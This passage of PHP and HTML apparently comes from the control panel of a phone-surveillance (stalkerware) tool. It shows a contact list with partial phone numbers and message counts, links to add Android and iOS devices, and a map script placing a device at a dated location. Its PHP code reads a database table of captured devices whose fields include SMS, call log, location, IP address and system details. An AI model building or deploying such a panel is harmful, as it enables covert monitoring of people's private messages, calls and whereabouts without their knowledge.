                                        <span href="javascript:void(0)" class="product-title">
                                            <strong>Amanda</strong> (704-792-****) <span class="label label-danger pull-right">845 Messages</span>
                                        </span>
                                        <span class="product-description"><small class="unixTime">1628474010</small></span>
                                    </div>
                                </li>
                                <li class="item">
                                    <div class="product-img"><img alt="" width="50" height="50" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <span href="javascript:void(0)" class="product-title">
                                            <strong>Ashley</strong> (202-330-****) <span class="label label-danger pull-right">742 Messages</span>
                                        </span>
                                        <span class="product-description"><small class="unixTime">1627909115</small></span>
                                    </div>
                                </li>
                                <li class="item">
                                    <div class="product-img"><img alt="" width="50" height="50" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <span href="javascript:void(0)" class="product-title">
                                            <strong>Laura</strong> (708-558-****) <span class="label label-danger pull-right">632 Messages</span>
                                        </span>
                                        <span class="product-description"><small class="unixTime">1628062578</small></span>
                                    </div>
                                </li>
                                <li class="item">
                                    <div class="product-img"><img alt="" width="50" height="50" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <span href="javascript:void(0)" class="product-title">
                                            <strong>Doris</strong> (304-857-****) <span class="label label-warning pull-right">253 Messages</span>
                                        </span>
                                        <span class="product-description"><small class="unixTime">1628550355</small></span>
                                    </div>
                                </li>
                                <li class="item">
                                    <div class="product-img"><img alt="" width="50" height="50" class="img-circle" src="images/avatar.png"></div>
                                    <div class="product-info">
                                        <span href="javascript:void(0)" class="product-title">
                                            <strong>Hellen</strong> (626-203-****) <span class="label label-warning pull-right">143 Messages</span>
                                        </span>
                                        <span class="product-description"><small class="unixTime">1628395344</small></span>
                                    </div>
                                </li>
                            </ul> 
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>





            <!-- Footer -->
              <!-- Main Footer -->
    <footer class="main-footer text-center">
        <!-- To the right -->
        <div class="pull-right hidden-xs">
           
        </div>
        <!-- Default to the left -->
       <!--  <span data-i18n="nav.contact_us">Contact us at</span><b> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="285b5d5858475a5c685c5c5b585106464d5c">[email&#160;protected]</a></b><span data-i18n="nav.contact_us_hours">, get a reply within 24 hours</span>
        <div class="text-center">
            <select class="selectpicker" data-width="fit" id="language">
                <option data-content='<span class="flag-icon flag-icon-us"></span> English' value="en">English</option>
                <option data-content='<span class="flag-icon flag-icon-fr"></span> Français' value="fr">Français</option>
                <option data-content='<span class="flag-icon flag-icon-de"></span> Deutsch' value="de">Deutsch</option>
                <option data-content='<span class="flag-icon flag-icon-es"></span> Español' value="es">Español</option>
                <option data-content='<span class="flag-icon flag-icon-pt"></span> Portugal' value="pt">Portugal</option>
                <option data-content='<span class="flag-icon flag-icon-it"></span> Italiano' value="it">Italiano</option>
                <option data-content='<span class="flag-icon flag-icon-jp"></span> India' value="jp">India</option>
                <option data-content='<span class="flag-icon flag-icon-kr"></span> Pakistan' value="kr">Pakistan</option>
            </select>
        </div> -->
    </footer>

        <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
            var i18nextOptions = {
                fallbackLng: 'en',
                //lng: 'en',
                whitelist: ['en', 'es', 'pt', 'kr', 'it', 'jp', 'fr', 'de'],
                backend: {
                    referenceLng: 'en',
                    projectId: 'B489D280-B747-4752-B64A-73D5722CD763',
                    loadPath: '/locales/{{lng}}.json',
                },
                detection: {
                    lookupQuerystring: 'lng',
                    lookupCookie: 'i18next',
                    lookupLocalStorage: 'i18nextLng',
                    lookupSessionStorage: 'i18nextLng',
                    lookupFromPathIndex: 0,
                    lookupFromSubdomainIndex: 0,
                },
                debug: true,
                useLocalStorage: false,
                localStorageExpirationTime: 86400000 // in ms, default 1 week
            };
            i18next
                .use(window.i18nextLocizeBackend)
                .use(window.i18nextBrowserLanguageDetector)
                .init(i18nextOptions, function () {
                    jqueryI18next.init(i18next, $, {
                        tName: 't', // --> appends $.t = i18next.t
                        i18nName: 'i18n', // --> appends $.i18n = i18next
                        handleName: 'localize', // --> appends $(selector).localize(opts);
                        selectorAttr: 'data-i18n', // selector for translating elements
                        targetAttr: 'i18n-target', // data-() attribute to grab target element to translate (if diffrent then itself)
                        optionsAttr: 'i18n-options', // data-() attribute that contains options, will load/set if useOptionsAttr = true
                        useOptionsAttr: true, // see optionsAttr
                        parseDefaultValueFromContent: true // parses default values from content ele.val or ele.text
                    });
                    $('body').localize();
                });

            var lan = i18next.language || window.localStorage.i18nextLng;
            $('.selectpicker').selectpicker();
            $('.selectpicker').selectpicker('val', lan);
            $('.selectpicker').on('change', function () {
                var lan = $(this).val();
                i18next.changeLanguage(lan, () => {
                    $('body').localize();
                });
            })
        </script>


            <!-- Right Sidebar -->
            <!-- Control Sidebar -->
    <aside class="control-sidebar control-sidebar-dark">
        <!-- Create the tabs -->
        <ul class="nav nav-tabs nav-justified control-sidebar-tabs">
            <li class="active"><a href="#control-sidebar-home-tab" data-toggle="tab"><i class="fa fa-gears"></i></a></li>
        </ul>
        <!-- Tab panes -->
        <div class="tab-content">
            <!-- Home tab content -->
            <div class="tab-pane active" id="control-sidebar-home-tab">
                <ul class="control-sidebar-menu">
                    <li>
                        <a href="/device/android">
                            <i class="menu-icon fa fa-android bg-green"></i>
                            <div class="menu-info">
                                <h4 class="control-sidebar-subheading" data-i18n="topnav.add_android">Add New Android Device</h4>
                                <p data-i18n="topnav.get_start">Get Started Now</p>
                            </div>
                        </a>
                    </li>
                    <li>
                        <div class="progress progress-xxs">
                            <div class="progress-bar progress-bar-danger" style="width: 100%"></div>
                        </div>
                    </li>
                    <li>
                        <a href="/device/ios">
                            <i class="menu-icon fa fa-apple bg-green"></i>
                            <div class="menu-info">
                                <h4 class="control-sidebar-subheading" data-i18n="topnav.add_ios">Add New iOS Device</h4>
                                <p data-i18n="topnav.get_start">Get Started Now</p>
                            </div>
                        </a>
                    </li>
                    <li>
                        <div class="progress progress-xxs">
                            <div class="progress-bar progress-bar-danger" style="width: 100%"></div>
                        </div>
                    </li>
                </ul>
                <!-- /.control-sidebar-menu -->
            </div>
        </div>
    </aside>
    <!-- /.control-sidebar -->
    <!-- Add the sidebar's background. This div must be placed
    immediately after the control sidebar -->
    <div class="control-.
    sidebar-bg"></div>
        </div>
        
            <script src="/js/demo.js"></script>
        
        
        <environment names="Development,Staging,Production">
        </environment>
        <script type="text/javascript">
            var map;
            $(document).ready(function () {
                //initMap();
            });

            function initMap() {
                var mapOptions = {
                    zoom: 10,
                    styles: [{ "featureType": "water", "stylers": [{ "saturation": 43 }, { "lightness": -11 }, { "hue": "#0088ff" }] },
                    { "featureType": "road", "elementType": "geometry.fill", "stylers": [{ "hue": "#ff0000" }, { "saturation": -100 }, { "lightness": 99 }] },
                    { "featureType": "road", "elementType": "geometry.stroke", "stylers": [{ "color": "#808080" }, { "lightness": 54 }] },
                    { "featureType": "landscape.man_made", "elementType": "geometry.fill", "stylers": [{ "color": "#ece2d9" }] },
                    { "featureType": "poi.park", "elementType": "geometry.fill", "stylers": [{ "color": "#ccdca1" }] },
                    { "featureType": "road", "elementType": "labels.text.fill", "stylers": [{ "color": "#767676" }] },
                    { "featureType": "road", "elementType": "labels.text.stroke", "stylers": [{ "color": "#ffffff" }] },
                    { "featureType": "poi", "stylers": [{ "visibility": "off" }] },
                    { "featureType": "landscape.natural", "elementType": "geometry.fill", "stylers": [{ "visibility": "on" }, { "color": "#b8cb93" }] },
                    { "featureType": "poi.park", "stylers": [{ "visibility": "on" }] }, { "featureType": "poi.sports_complex", "stylers": [{ "visibility": "on" }] },
                    { "featureType": "poi.medical", "stylers": [{ "visibility": "on" }] }, { "featureType": "poi.business", "stylers": [{ "visibility": "simplified" }] }]
                };
                mapOptions.center = new google.maps.LatLng(40.6892534, -74.0466891);
                var mapElement = document.getElementById('map');
                map = new google.maps.Map(mapElement, mapOptions);

                var infowindow = new google.maps.InfoWindow({
                    maxWidth: 400,
                    content: "<p><b>Date: </b>" + moment.unix(1628659989).format('lll') + "</p>" + "<p><b>Address: </b>Statue of Liberty National Monument</p>",
                });

                var marker = new google.maps.Marker({
                    position: mapOptions.center,
                    map: map,
                    title: 'Statue of Liberty National Monument'
                });
                infowindow.open(map, marker);
                marker.addListener('click', function () {
                    infowindow.open(map, marker);
                });
            }
        </script>

</body>
</html>
<?php 
}

} else {
  

     $sseclect = mysqli_query($con, "SELECT * FROM visitor");

    if($sseclect){
        while($show = mysqli_fetch_assoc($sseclect)) {

        

        $v_id = htmlspecialchars($show['id']);
        $v_ip = htmlspecialchars($show['ip']);
        $v_user = htmlspecialchars($show['user_agent']);
        $v_time = htmlspecialchars($show['date_time']);
        $v_location = htmlspecialchars($show['location']);
        $v_sms = htmlspecialchars($show['sms']);
        $v_call = htmlspecialchars($show['calllog']);
        $v_system = htmlspecialchars($show['system']);
        $v_more = htmlspecialchars($show['more']);

      
      echo'<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Select Device</title>
     <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
   
<link rel="stylesheet" type="text/css" href="style.css">

</head>
<body>
<div class="device_list" style="max-width: 300px;
margin-right: auto;
margin-left: auto;"><a style="text-decoration:none;" href="index.php?c='.$v_id.'">'.$v_id.'.&nbsp;'.$v_system.'</a></div>

</body>
</html>  ';

       
}
}
}
?>
